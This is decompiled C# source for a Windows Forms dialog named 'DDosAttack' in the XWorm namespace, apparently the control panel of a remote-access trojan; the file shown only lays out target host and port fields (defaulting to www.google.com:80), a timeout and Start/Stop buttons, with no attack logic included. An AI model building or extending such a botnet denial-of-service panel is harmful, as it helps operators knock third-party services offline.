namespace XWorm
{
	// Token: 0x0200000E RID: 14
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class DDosAttack : global::System.Windows.Forms.Form
	{
		// Token: 0x06000096 RID: 150 RVA: 0x00005BB4 File Offset: 0x00003DB4
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00005C04 File Offset: 0x00003E04
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::XWorm.DDosAttack));
			this.label4 = new global::System.Windows.Forms.Label();
			this.StatusStrip1 = new global::System.Windows.Forms.StatusStrip();
			this.ToolStripStatusLabel2 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.ToolStripStatusLabel1 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.Timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.Timer2 = new global::System.Windows.Forms.Timer(this.components);
			this.Guna2GroupBox1 = new global::Guna.UI2.WinForms.Guna2GroupBox();
			this.txtPort = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtHost = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.Label5 = new global::System.Windows.Forms.Label();
			this.Label6 = new global::System.Windows.Forms.Label();
			this.Guna2GroupBox2 = new global::Guna.UI2.WinForms.Guna2GroupBox();
			this.txtTimeout = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.Label7 = new global::System.Windows.Forms.Label();
			this.Guna2GroupBox3 = new global::Guna.UI2.WinForms.Guna2GroupBox();
			this.Guna2GradientButton3 = new global::Guna.UI2.WinForms.Guna2GradientButton();
			this.Guna2GradientButton2 = new global::Guna.UI2.WinForms.Guna2GradientButton();
			this.StatusStrip1.SuspendLayout();
			this.Guna2GroupBox1.SuspendLayout();
			this.Guna2GroupBox2.SuspendLayout();
			this.Guna2GroupBox3.SuspendLayout();
			base.SuspendLayout();
			this.label4.AutoSize = true;
			this.label4.Location = new global::System.Drawing.Point(203, 38);
			this.label4.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label4.Name = "label4";
			this.label4.Size = new global::System.Drawing.Size(28, 15);
			this.label4.TabIndex = 5;
			this.label4.Text = "Min";
			this.StatusStrip1.BackColor = global::System.Drawing.Color.White;
			this.StatusStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripStatusLabel2,
				this.ToolStripStatusLabel1
			});
			this.StatusStrip1.Location = new global::System.Drawing.Point(0, 276);
			this.StatusStrip1.Name = "StatusStrip1";
			this.StatusStrip1.Size = new global::System.Drawing.Size(317, 22);
			this.StatusStrip1.TabIndex = 58;
			this.StatusStrip1.Text = "StatusStrip1";
			this.ToolStripStatusLabel2.ForeColor = global::System.Drawing.Color.Black;
			this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
			this.ToolStripStatusLabel2.Size = new global::System.Drawing.Size(13, 17);
			this.ToolStripStatusLabel2.Text = "..";
			this.ToolStripStatusLabel1.ForeColor = global::System.Drawing.Color.Black;
			this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
			this.ToolStripStatusLabel1.Size = new global::System.Drawing.Size(13, 17);
			this.ToolStripStatusLabel1.Text = "..";
			this.Timer1.Interval = 1000;
			this.Timer2.Enabled = true;
			this.Timer2.Interval = 3000;
			this.Guna2GroupBox1.BorderRadius = 3;
			this.Guna2GroupBox1.Controls.Add(this.txtPort);
			this.Guna2GroupBox1.Controls.Add(this.txtHost);
			this.Guna2GroupBox1.Controls.Add(this.Label5);
			this.Guna2GroupBox1.Controls.Add(this.Label6);
			this.Guna2GroupBox1.CustomBorderThickness = new global::System.Windows.Forms.Padding(0);
			this.Guna2GroupBox1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2GroupBox1.ForeColor = global::System.Drawing.Color.Black;
			this.Guna2GroupBox1.Location = new global::System.Drawing.Point(12, 12);
			this.Guna2GroupBox1.Name = "Guna2GroupBox1";
			this.Guna2GroupBox1.Size = new global::System.Drawing.Size(291, 97);
			this.Guna2GroupBox1.TabIndex = 3;
			this.Guna2GroupBox1.Text = "Target";
			this.txtPort.BorderColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.txtPort.BorderRadius = 3;
			this.txtPort.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtPort.DefaultText = "80";
			this.txtPort.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtPort.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtPort.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtPort.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtPort.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.txtPort.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtPort.ForeColor = global::System.Drawing.Color.Black;
			this.txtPort.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.txtPort.Location = new global::System.Drawing.Point(57, 64);
			this.txtPort.Name = "txtPort";
			this.txtPort.PasswordChar = '\0';
			this.txtPort.PlaceholderForeColor = global::System.Drawing.Color.Black;
			this.txtPort.PlaceholderText = "";
			this.txtPort.SelectedText = "";
			this.txtPort.Size = new global::System.Drawing.Size(216, 21);
			this.txtPort.TabIndex = 60;
			this.txtHost.BorderColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.txtHost.BorderRadius = 3;
			this.txtHost.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtHost.DefaultText = "www.google.com";
			this.txtHost.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtHost.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtHost.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtHost.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtHost.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.txtHost.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtHost.ForeColor = global::System.Drawing.Color.Black;
			this.txtHost.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.txtHost.Location = new global::System.Drawing.Point(57, 37);
			this.txtHost.Name = "txtHost";
			this.txtHost.PasswordChar = '\0';
			this.txtHost.PlaceholderForeColor = global::System.Drawing.Color.Black;
			this.txtHost.PlaceholderText = "";
			this.txtHost.SelectedText = "";
			this.txtHost.Size = new global::System.Drawing.Size(216, 21);
			this.txtHost.TabIndex = 59;
			this.Label5.AutoSize = true;
			this.Label5.Location = new global::System.Drawing.Point(16, 66);
			this.Label5.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.Label5.Name = "Label5";
			this.Label5.Size = new global::System.Drawing.Size(35, 15);
			this.Label5.TabIndex = 3;
			this.Label5.Text = "Port :";
			this.Label6.AutoSize = true;
			this.Label6.Location = new global::System.Drawing.Point(14, 38);
			this.Label6.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.Label6.Name = "Label6";
			this.Label6.Size = new global::System.Drawing.Size(38, 15);
			this.Label6.TabIndex = 4;
			this.Label6.Text = "Host :";
			this.Guna2GroupBox2.BorderRadius = 3;
			this.Guna2GroupBox2.Controls.Add(this.label4);
			this.Guna2GroupBox2.Controls.Add(this.txtTimeout);
			this.Guna2GroupBox2.Controls.Add(this.Label7);
			this.Guna2GroupBox2.CustomBorderThickness = new global::System.Windows.Forms.Padding(0);
			this.Guna2GroupBox2.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2GroupBox2.ForeColor = global::System.Drawing.Color.Black;
			this.Guna2GroupBox2.Location = new global::System.Drawing.Point(12, 115);
			this.Guna2GroupBox2.Name = "Guna2GroupBox2";
			this.Guna2GroupBox2.Size = new global::System.Drawing.Size(291, 70);
			this.Guna2GroupBox2.TabIndex = 59;
			this.Guna2GroupBox2.Text = "Settings";
			this.txtTimeout.BorderColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.txtTimeout.BorderRadius = 3;
			this.txtTimeout.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtTimeout.DefaultText = "5";
			this.txtTimeout.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtTimeout.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtTimeout.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtTimeout.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtTimeout.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.txtTimeout.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtTimeout.ForeColor = global::System.Drawing.Color.Black;
			this.txtTimeout.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.txtTimeout.Location = new global::System.Drawing.Point(77, 35);
			this.txtTimeout.Name = "txtTimeout";
			this.txtTimeout.PasswordChar = '\0';
			this.txtTimeout.PlaceholderForeColor = global::System.Drawing.Color.Black;
			this.txtTimeout.PlaceholderText = "";
			this.txtTimeout.SelectedText = "";
			this.txtTimeout.Size = new global::System.Drawing.Size(121, 21);
			this.txtTimeout.TabIndex = 61;
			this.Label7.AutoSize = true;
			this.Label7.Location = new global::System.Drawing.Point(14, 36);
			this.Label7.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.Label7.Name = "Label7";
			this.Label7.Size = new global::System.Drawing.Size(57, 15);
			this.Label7.TabIndex = 5;
			this.Label7.Text = "Timeout :";
			this.Guna2GroupBox3.BorderRadius = 3;
			this.Guna2GroupBox3.Controls.Add(this.Guna2GradientButton3);
			this.Guna2GroupBox3.Controls.Add(this.Guna2GradientButton2);
			this.Guna2GroupBox3.CustomBorderThickness = new global::System.Windows.Forms.Padding(0);
			this.Guna2GroupBox3.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2GroupBox3.ForeColor = global::System.Drawing.Color.Black;
			this.Guna2GroupBox3.Location = new global::System.Drawing.Point(12, 191);
			this.Guna2GroupBox3.Name = "Guna2GroupBox3";
			this.Guna2GroupBox3.Size = new global::System.Drawing.Size(291, 74);
			this.Guna2GroupBox3.TabIndex = 60;
			this.Guna2GroupBox3.Text = "Command";
			this.Guna2GradientButton3.BorderRadius = 4;
			this.Guna2GradientButton3.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton3.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton3.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton3.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton3.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2GradientButton3.FillColor2 = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2GradientButton3.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2GradientButton3.ForeColor = global::System.Drawing.Color.White;
			this.Guna2GradientButton3.Image = global::XWorm.My.Resources.Resources._Stop;
			this.Guna2GradientButton3.ImageAlign = global::System.Windows.Forms.HorizontalAlignment.Left;
			this.Guna2GradientButton3.ImageSize = new global::System.Drawing.Size(17, 17);
			this.Guna2GradientButton3.Location = new global::System.Drawing.Point(170, 38);
			this.Guna2GradientButton3.Name = "Guna2GradientButton3";
			this.Guna2GradientButton3.Size = new global::System.Drawing.Size(103, 24);
			this.Guna2GradientButton3.TabIndex = 98;
			this.Guna2GradientButton3.Text = "Stop";
			this.Guna2GradientButton2.BorderRadius = 4;
			this.Guna2GradientButton2.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton2.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton2.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton2.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton2.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2GradientButton2.FillColor2 = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2GradientButton2.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2GradientButton2.ForeColor = global::System.Drawing.Color.White;
			this.Guna2GradientButton2.Image = global::XWorm.My.Resources.Resources.Play;
			this.Guna2GradientButton2.ImageAlign = global::System.Windows.Forms.HorizontalAlignment.Left;
			this.Guna2GradientButton2.ImageSize = new global::System.Drawing.Size(17, 17);
			this.Guna2GradientButton2.Location = new global::System.Drawing.Point(17, 38);
			this.Guna2GradientButton2.Name = "Guna2GradientButton2";
			this.Guna2GradientButton2.Size = new global::System.Drawing.Size(103, 24);
			this.Guna2GradientButton2.TabIndex = 97;
			this.Guna2GradientButton2.Text = "Start";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(317, 298);
			base.Controls.Add(this.Guna2GroupBox3);
			base.Controls.Add(this.Guna2GroupBox2);
			base.Controls.Add(this.Guna2GroupBox1);
			base.Controls.Add(this.StatusStrip1);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "DDosAttack";
			this.Text = "DDosAttack";
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			this.Guna2GroupBox1.ResumeLayout(false);
			this.Guna2GroupBox1.PerformLayout();
			this.Guna2GroupBox2.ResumeLayout(false);
			this.Guna2GroupBox2.PerformLayout();
			this.Guna2GroupBox3.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000035 RID: 53
		private global::System.ComponentModel.IContainer components;
	}
}
